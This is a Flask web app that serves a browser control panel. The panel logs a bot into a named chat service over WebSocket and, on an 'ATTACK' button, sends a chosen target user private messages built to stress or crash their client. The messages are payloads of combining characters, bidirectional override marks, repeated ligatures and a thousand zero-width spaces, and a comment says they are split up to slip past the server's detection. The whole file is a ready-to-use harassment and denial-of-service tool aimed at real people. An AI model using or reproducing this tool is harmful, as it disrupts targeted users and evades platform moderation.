import os
from flask import Flask, render_template_string

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TITAN OS - DEBUG & STRIKE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --neon: #00f3ff; --term: #00ff41; --danger: #ff003c; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Consolas', monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        .nav-bar { background: #111; padding: 15px; border-bottom: 2px solid var(--neon); display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.8); }
        input { background: #000; border: 1px solid #333; color: var(--neon); padding: 10px; border-radius: 4px; font-size: 12px; outline: none; border: 1px solid #444; }
        
        button { padding: 10px; font-weight: bold; cursor: pointer; border: 1px solid var(--neon); background: transparent; color: var(--neon); font-size: 11px; text-transform: uppercase; }
        button:hover { background: var(--neon); color: #000; }
        .atk-btn { background: var(--danger) !important; color: #fff !important; border: none !important; box-shadow: 0 0 10px var(--danger); }

        .terminal-zone { flex: 1; display: flex; flex-direction: column; background: #000; overflow: hidden; }
        .term-head { background: #1a1a1a; padding: 8px 15px; font-size: 11px; color: #666; display: flex; justify-content: space-between; border-bottom: 1px solid #222; }
        .terminal-body { flex: 1; overflow-y: scroll; padding: 15px; font-size: 12px; scroll-behavior: smooth; }
        
        .line { margin-bottom: 10px; border-left: 3px solid #222; padding-left: 12px; word-break: break-all; }
        .in { color: var(--term); border-color: var(--term); } 
        .out { color: var(--neon); border-color: var(--neon); }
        .err { color: var(--danger); border-color: var(--danger); }
        
        /* Debugging Panel Style (JSON BOX) */
        .json-dump { background: #080808; padding: 10px; margin-top: 5px; border: 1px solid #1a1a1a; display: block; color: #00ccff; font-size: 11px; border-radius: 4px; white-space: pre-wrap; font-family: monospace; }
        
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
    </style>
</head>
<body>
    <div class="nav-bar">
        <input type="text" id="u" placeholder="Bot User">
        <input type="password" id="p" placeholder="Bot Pass">
        <input type="text" id="r" placeholder="Room Name">
        <input type="text" id="t" placeholder="Target User">
        <div style="display:flex; gap:5px;">
            <button onclick="connectWS()">INITIALIZE</button>
            <button class="atk-btn" onclick="fireAttack()">ATTACK</button>
            <button onclick="document.getElementById('terminal').innerHTML=''" style="border-color:#444;color:#444">CLEAR</button>
        </div>
    </div>

    <div class="terminal-zone">
        <div class="term-head">
            <span>LIVE_DEBUG_TERMINAL v4.2 [MONITORING_ACTIVE]</span>
            <span id="stat">OFFLINE</span>
        </div>
        <div id="terminal" class="terminal-body">
            <div class="line">System ready. Enter credentials and click INITIALIZE.</div>
        </div>
    </div>

    <script>
        let ws; let pinger; const term = document.getElementById('terminal');

        function log(msg, type='sys', payload=null) {
            const div = document.createElement('div');
            div.className = `line ${type}`;
            let html = `<b>[${new Date().toLocaleTimeString()}]</b> ${msg}`;
            if(payload) {
                html += `<div class="json-dump">${JSON.stringify(payload, null, 2)}</div>`;
            }
            div.innerHTML = html;
            term.appendChild(div);
            term.scrollTop = term.scrollHeight;
        }

        function connectWS() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value, r = document.getElementById('r').value;
            ws = new WebSocket("wss://chatp.net:5333/server");

            ws.onopen = () => {
                document.getElementById('stat').innerText = "ONLINE";
                document.getElementById('stat').style.color = "var(--term)";
                log("Socket Connected. Tunnel Established.", "sys");
                const loginData = {handler: "login", id: Math.random(), username: u, password: p, platform: "web"};
                ws.send(JSON.stringify(loginData));
                log("SENT >> LOGIN_REQUEST", "out", loginData);
                pinger = setInterval(() => { if(ws.readyState === 1) ws.send(JSON.stringify({handler:"ping"})); }, 25000);
            };

            ws.onmessage = (e) => {
                const data = JSON.parse(e.data);
                log("RECV << " + (data.handler || "EVENT"), "in", data);
                if(data.handler === "login_event" && data.type === "success") {
                    ws.send(JSON.stringify({handler: "room_join", id: Math.random(), name: r}));
                }
            };

            ws.onclose = () => {
                clearInterval(pinger);
                document.getElementById('stat').innerText = "OFFLINE";
                document.getElementById('stat').style.color = "var(--danger)";
                log("WebSocket Disconnected. Attempting Auto-Relogin...", "err");
                setTimeout(connectWS, 3000); // Auto-Reconnect
            };
        }

        function fireAttack() {
            const target = document.getElementById('t').value;
            if(!ws || ws.readyState !== 1) return log("Bot Offline!", "err");

            log("Executing Fragmented Memory Stress Attack...", "out");
            
            // Fragmented Payloads (Server radar ke niche)
            const payloads = [
                "జ్ఞा" + " ҉ ".repeat(10),
                "\\u202E" + "L_A_G" + "\\u202D",
                "﷽".repeat(10),
                "\\u200B".repeat(1000) + "⚠️"
            ];

            payloads.forEach((p, i) => {
                setTimeout(() => {
                    const pkt = {handler: "chat_message", to: target, type: "text", body: p, is_private: true};
                    ws.send(JSON.stringify(pkt));
                    log(`INJECTED STAGE ${i+1}`, "err", pkt);
                }, i * 900); // Precision timing
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
